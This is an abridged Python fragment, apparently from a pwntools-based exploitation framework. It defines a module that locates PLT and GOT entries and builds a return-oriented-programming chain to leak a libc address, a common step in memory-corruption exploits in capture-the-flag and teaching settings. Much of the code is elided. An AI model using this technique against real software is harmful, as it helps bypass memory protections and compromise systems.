...
class GetLibcAddress(AbstractModule):
    ...
    def execute(cls,
                ...
                handler: typing.Callable | None = None, *args, **kwargs) -> Optional:
        ...
        result = FindFunction.execute(process, print_function, Method.PLT)
        if not result:
        ...
        result = FindFunction.execute(process, target_functions, Method.GOT)
        if not result:
        ...
        rop_chain = (
                p64(process.target.rop.pop_rdi) +
                p64(target_function_address) +
                p64(print_function_address) +
                p64(process.target.elf.main_ptr)
        )
        ...
        data = data.strip(b'\n')
        if len(data) > 8:
            logger.critical(f"Unexpected number of bytes received: {data}")
            return None
